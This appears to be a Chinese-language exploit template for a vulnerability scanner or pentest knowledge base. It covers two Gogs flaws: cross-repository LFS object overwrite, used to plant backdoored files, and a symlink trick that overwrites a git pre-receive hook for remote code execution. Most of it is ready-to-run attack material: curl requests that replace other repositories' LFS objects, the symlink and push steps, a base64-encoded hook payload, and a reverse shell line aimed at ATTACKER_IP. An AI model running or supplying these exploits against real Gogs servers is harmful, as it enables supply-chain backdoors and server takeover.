---
id: GOGS-LFS-OVERWRITE
title: Gogs LFS 对象跨仓库覆写与符号链接 RCE
product: gogs
vendor: gogs
version_affected: "< 0.14.2"
severity: CRITICAL
tags: [supply_chain, lfs, file_overwrite, symlink, rce, gogs, git, 需要认证]
fingerprint: ["gogs", "Gogs", "Powered by Gogs", "/info/lfs/objects/"]
---

## 漏洞描述

Gogs 是自托管 Git 服务。CVE-2026-25921: 所有 LFS 对象存储在同一路径下（无仓库隔离），且上传时不验证文件内容与声称的 SHA-256 哈希是否匹配。攻击者可通过自己的仓库覆写任意其他仓库的 LFS 对象，实现供应链攻击（注入后门）。

**前提**: 需要任意普通用户账号

## 影响版本

- CVE-2026-25921（LFS对象覆写）: Gogs < 0.14.2
- CVE-2025-8110（符号链接RCE）: Gogs ≤ 0.13.3

## 前置条件

- 目标开放 3000 端口（默认），运行 Gogs
- 需要任意普通用户账号（可注册或已有凭据）
- 需知道目标仓库的 LFS 对象 OID（SHA-256）

## 利用步骤

### 覆写其他仓库的 LFS 对象

```bash
# 已知目标仓库的 LFS 对象 OID（SHA-256）
TARGET_OID="5f8c5042d51400e9e2e9bed01353edacf72edc88340038145229cd494b5fe08a"
ATTACKER_CRED="user2:54fde9fb7b7f9442c7368881b266f1a830231950"

# Step 1: 在攻击者仓库请求上传同 OID 对象
curl -X POST "http://TARGET:3000/user2/public.git/info/lfs/objects/batch" \
  -H "Content-Type: application/vnd.git-lfs+json" \
  -u "$ATTACKER_CRED" \
  -d "{
    \"operation\": \"upload\",
    \"objects\": [{\"oid\": \"$TARGET_OID\", \"size\": 1048576}],
    \"ref\": {\"name\": \"refs/heads/master\"}
  }"

# Step 2: 上传恶意内容（内容与声称的 SHA-256 不符也会被接受）
curl -X PUT \
  "http://TARGET:3000/user2/public.git/info/lfs/objects/basic/$TARGET_OID" \
  -H "Content-Type: application/octet-stream" \
  -u "$ATTACKER_CRED" \
  --data-binary @backdoored_file.bin

# Step 3: 验证覆写成功
curl "http://TARGET:3000/admin1/testlfs.git/info/lfs/objects/basic/$TARGET_OID" \
  -u "admin1:admin1_token" -o downloaded.bin
# downloaded.bin 现在是攻击者的恶意文件
```

### 攻击场景

1. **供应链后门注入**: 目标仓库使用 LFS 存储编译好的二进制文件、模型权重、Docker 镜像层等，攻击者替换为含后门的版本
2. **恶意代码分发**: 其他用户 `git lfs pull` 时无任何警告地下载到篡改后的文件
3. **枚举 LFS 对象**: 通过 `git clone` + `git lfs ls-files` 获取仓库的 LFS OID 列表

**根因**:
- `internal/lfsutil/storage.go`: 存储路径不含 repo ID，所有仓库共享同一 LFS 目录
- 上传时不验证文件内容的 SHA-256 与声称的 OID 是否匹配
- 允许重复上传覆写已有对象（原设计假设客户端可信）

## Payload

```bash
TARGET_OID="目标LFS对象的SHA256哈希"
ATTACKER_CRED="attacker_user:attacker_token"

# Step 1: 请求上传同OID对象
curl -X POST "http://target:3000/attacker_user/repo.git/info/lfs/objects/batch" \
  -H "Content-Type: application/vnd.git-lfs+json" \
  -u "$ATTACKER_CRED" \
  -d "{\"operation\":\"upload\",\"objects\":[{\"oid\":\"$TARGET_OID\",\"size\":1048576}],\"ref\":{\"name\":\"refs/heads/master\"}}"

# Step 2: 上传恶意内容覆写目标LFS对象
curl -X PUT "http://target:3000/attacker_user/repo.git/info/lfs/objects/basic/$TARGET_OID" \
  -H "Content-Type: application/octet-stream" \
  -u "$ATTACKER_CRED" \
  --data-binary @backdoored_file.bin
```

## 验证方法

```bash
# 验证Gogs版本
curl -s "http://target:3000/api/v1/version" | grep -o '"version":"[^"]*"'

# 验证LFS接口可访问
curl -s -o /dev/null -w "%{http_code}" -X POST \
  "http://target:3000/attacker_user/repo.git/info/lfs/objects/batch" \
  -H "Content-Type: application/vnd.git-lfs+json" \
  -u "$ATTACKER_CRED" \
  -d '{"operation":"download","objects":[{"oid":"test","size":1}]}'
# 返回200表示LFS接口正常

# 验证覆写成功（从目标仓库下载同OID应返回攻击者的内容）
curl -s "http://target:3000/victim_user/victim_repo.git/info/lfs/objects/basic/$TARGET_OID" \
  -u "$ATTACKER_CRED" -o downloaded.bin
md5sum downloaded.bin backdoored_file.bin
```

## 指纹确认

```bash
curl -s http://TARGET:3000/ | grep -i "gogs\|Powered by"
curl -s http://TARGET:3000/api/v1/version
```

## CVE-2025-8110: 符号链接覆写 Git Hook → RCE

**影响版本**: Gogs ≤ 0.13.3
**前提**: 需要任意普通用户账号

通过创建指向 `.git/hooks/pre-receive` 的符号链接，然后通过 API 修改符号链接内容注入恶意脚本，`git push` 触发执行。

### 攻击步骤

**Step 1 — 注册用户、创建仓库、生成 API Token**

创建仓库并初始化（勾选生成 README），然后在 用户设置→授权应用 生成 API Token。

**Step 2 — 创建符号链接推送到仓库**

Docker 部署时服务器路径: `/data/git/gogs-repositories/<user>/<repo>.git/`

```bash
# 在 Linux 环境构建符号链接
mkdir -p /data/git/gogs-repositories/USER/REPO.git/hooks
touch /data/git/gogs-repositories/USER/REPO.git/hooks/pre-receive
ln -s /data/git/gogs-repositories/USER/REPO.git/hooks/pre-receive ./link_poc

# 克隆仓库、添加符号链接、推送
git clone http://TARGET:3000/USER/REPO.git
cp link_poc REPO/
cd REPO
git add link_poc
git commit -m "add link"
git push origin master
```

**Step 3 — 通过 API 修改符号链接内容（注入恶意脚本）**

```bash
# 生成恶意脚本并 base64 编码
echo -ne '#!/usr/bin/env bash\nid > /tmp/pwned\nexit 0\n' | base64
# IyEvdXNyL2Jpbi9lbnYgYmFzaAppZCA+IC90bXAvcHduZWQKZXhpdCAwCg==
```

```http
PUT /api/v1/repos/USER/REPO/contents/link_poc HTTP/1.1
Host: TARGET:3000
Authorization: token YOUR_API_TOKEN
Content-Type: application/json

{"content":"IyEvdXNyL2Jpbi9lbnYgYmFzaAppZCA+IC90bXAvcHduZWQKZXhpdCAwCg==","message":"edit","branch":"master"}
```

**Step 4 — 触发执行**

```bash
cd REPO
touch x && git add x && git commit -m "trigger" && git push origin master
# pre-receive hook 被触发，恶意脚本执行
```

反弹 Shell 版本:
```bash
echo -ne '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\nexit 0\n' | base64
# 替换 Step 3 中的 content 字段
```
